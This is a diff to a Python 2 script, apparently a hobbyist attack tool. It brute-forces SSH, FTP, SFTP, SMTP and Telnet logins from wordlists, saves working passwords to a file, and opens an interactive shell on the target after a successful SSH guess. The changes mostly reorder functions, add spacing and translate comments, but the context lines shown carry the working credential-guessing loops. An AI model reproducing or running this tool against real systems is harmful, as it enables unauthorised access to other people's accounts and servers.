@@ -13,7 +13,22 @@ password_output = "/root/Desktop/password_output"
 password_output = open(password_output, "a", 0)
 s = pxssh.pxssh()
 
-#Connections
+#SSH_Connect
+
+def ssh_connect(s, IP, username, password, password_output):
+    print("Connect to target ?\n")
+    print("Be careful ! Still Buggy")
+    wahl_connect = raw_input("Y/N: ")
+    if wahl_connect == "y" or wahl_connect == "Y" :
+        ssh_connect_shell(s, IP, username, password)
+    elif wahl_connect == "n" or wahl_connect == "N":
+        main(s)
+    else:
+        print("Correct this answer")
+        ssh_connect(s, IP, username, password, password_output)
+    main(s)
+    return
+#SSH_Shell
 
 def ssh_connect_shell(s, IP, username, password):
     s = pxssh.pxssh()
@@ -33,28 +48,18 @@ def ssh_connect_shell(s, IP, username, password):
                 main(s)
     return
 
-def ssh_connect(s, IP, username, password, password_output):
-    print("Connect to target ?\n")
-    print("Be careful ! Still Buggy")
-    wahl_connect = raw_input("Y/N: ")
-    if wahl_connect == "y" or wahl_connect == "Y" :
-        ssh_connect_shell(s, IP, username, password)
-    elif wahl_connect == "n" or wahl_connect == "N":
-        main(s)
-    else:
-        print("Correct this answer")
-        ssh_connect(s, IP, username, password, password_output)
-    main(s)
-    return
 
 #Bruting
     
+    
 def ssh_brute(s, password_output):
+    
     #Vars
     IP = raw_input("IP: ")
     username = raw_input("User: ")
     passwordfile =  "/usr/share/wordlists/ssh_wordlist"
     passwordfile = open(passwordfile, "r")
+    
     #Main_Brute
     for password in passwordfile:
         try: 
@@ -78,6 +83,7 @@ def ssh_brute(s, password_output):
 
 
 def ftp_brute(password_output):
+    
     #Vars
     IP = raw_input("IP: ")
     USER = raw_input("User: ")
@@ -102,12 +108,16 @@ def ftp_brute(password_output):
     print("\n" * 80)
     main(s)
     return
+
+
 def sftp_brute(password_output):
+
     #Vars
     IP = raw_input('IP: ')
     username = raw_input('User: ')
     passwordfile = "/usr/share/wordlists/sftp_wordlist"
     passwordfile = open(passwordfile, "r")
+
     #Main_Brute
     for password in passwordfile:
         try:                                                            
@@ -126,11 +136,12 @@ def sftp_brute(password_output):
     print("End of Wordlist")
     time.sleep(3)
     print("\n" * 80)
-    print("Arsch")
     main(s)
     return
 
+
 def smtp_brute(password_output):
+
     #Vars
     print("A BIT BUGGY ! \n")
     IP = raw_input("IP: ")
@@ -143,6 +154,7 @@ def smtp_brute(password_output):
     smtpserver.starttls()
     passwordfile = "/usr/share/wordlists/smtp_wordlist"
     passwordfile = open(passwordfile, "r")
+
     #Main_Brute
     for password in passwordfile:
             try:
@@ -159,12 +171,15 @@ def smtp_brute(password_output):
     main(s)                
     return
 
+
 def telnet_brute(password_output):
+
     #Vars
     IP = raw_input("IP: ")
     user = raw_input("User: ")
     passwordfile = "/usr/share/wordlists/telnet_wordlist"
     passwordfile = open(passwordfile, "r")
+
     #Main_Brute
     def telnet_login(password_output):
         for password in passwordfile:
@@ -188,7 +203,6 @@ def telnet_brute(password_output):
                 else:
                     target.close()
                     print("Wrong_Login with: %s" % password)
-                    target.close()
                     telnet_login()
                 telnet_login()
             except:
@@ -202,8 +216,11 @@ def telnet_brute(password_output):
     print("\n" * 80)
     main(s)
     return
+
+
 def show_passwordfile(password_output):
     #Vars
+
     #Main
     password_output = "/root/Desktop/password_output"
     password_output = open(password_output, 'r')
@@ -212,7 +229,7 @@ def show_passwordfile(password_output):
     print("[+] Return")
     return
 
-#was darfs sein?
+#Whats your choice ?
 
 def main(s):
     try:
@@ -267,7 +284,7 @@ def main(s):
     except KeyboardInterrupt:
         print("[-] EXIT")
 
-#Main-Programm
+#Main-Program-Start
 main(s)
 
 
